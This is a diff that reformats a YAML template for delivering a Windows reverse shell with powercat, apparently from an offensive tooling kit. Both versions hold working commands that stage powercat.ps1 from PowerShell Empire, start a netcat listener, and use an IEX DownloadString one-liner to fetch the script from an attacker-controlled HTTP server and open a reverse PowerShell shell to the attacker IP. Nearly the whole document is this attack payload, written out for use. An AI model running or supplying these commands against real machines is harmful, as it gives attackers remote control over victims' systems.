@@ -1,23 +1,20 @@
+---
 metadata:
-  filename: deliver-windows-revshell-powercat.ps1.yaml
-  tags:
-  - shell
-  - windows
-  created: '2025-03-29'
-  author: Unknown
-content: "mkdir -p packstation/outbound; cp -n /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1\
-  \ packstation/outbound; \\\necho '================================================================';\
-  \ \\\necho '                      -----PowerShell-----                      '; \\\
-  \necho 'Deliver only: iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port\
-  \ }}/powercat.ps1 -Outfile {{ delivery_path_windows }}\\powercat.ps1'; \\\necho\
-  \ 'Preparation 1: nc -lvnp {{ shell_port }}'; \\\necho 'Deliver + Execute: IEX (New-Object\
-  \ System.Net.Webclient).DownloadString(\"http://{{ attacker_ip }}:{{ delivery_outbound_port\
-  \ }}/powercat.ps1\");powercat -c {{ attacker_ip }} -p {{ shell_port }} -e powershell';\
-  \ \\\necho '================================================================'; \\\
-  \necho '                         -----CMD-----                          '; \\\n\
-  echo 'Preparation 1: nc -lvnp {{ shell_port }}'; \\\necho 'Deliver + Execute: powershell\
-  \ -c \"IEX(New-Object System.Net.WebClient).DownloadString(\\'http://{{ attacker_ip\
-  \ }}:{{ delivery_outbound_port }}/powercat.ps1\\');powercat -c {{ attacker_ip }}\
-  \ -p {{ shell_port }} -e powershell'; \\\necho '================================================================';\
-  \ \\\n python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{\
-  \ delivery_outbound_port }} -d packstation/outbound\n"
+  filename: "deliver-windows-revshell-powercat.ps1.yaml"
+  tags: ["shell", "windows"]
+  created: "2025-03-29"
+  author: "Unknown"
+
+content: |
+  mkdir -p packstation/outbound; cp -n /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 packstation/outbound; \
+  echo '================================================================'; \
+  echo '                      -----PowerShell-----                      '; \
+  echo 'Deliver only: iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/powercat.ps1 -Outfile {{ delivery_path_windows }}\powercat.ps1'; \
+  echo 'Preparation 1: nc -lvnp {{ shell_port }}'; \
+  echo 'Deliver + Execute: IEX (New-Object System.Net.Webclient).DownloadString("http://{{ attacker_ip }}:{{ delivery_outbound_port }}/powercat.ps1");powercat -c {{ attacker_ip }} -p {{ shell_port }} -e powershell'; \
+  echo '================================================================'; \
+  echo '                         -----CMD-----                          '; \
+  echo 'Preparation 1: nc -lvnp {{ shell_port }}'; \
+  echo 'Deliver + Execute: powershell -c "IEX(New-Object System.Net.WebClient).DownloadString(\'http://{{ attacker_ip }}:{{ delivery_outbound_port }}/powercat.ps1\');powercat -c {{ attacker_ip }} -p {{ shell_port }} -e powershell'; \
+  echo '================================================================'; \
+  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound
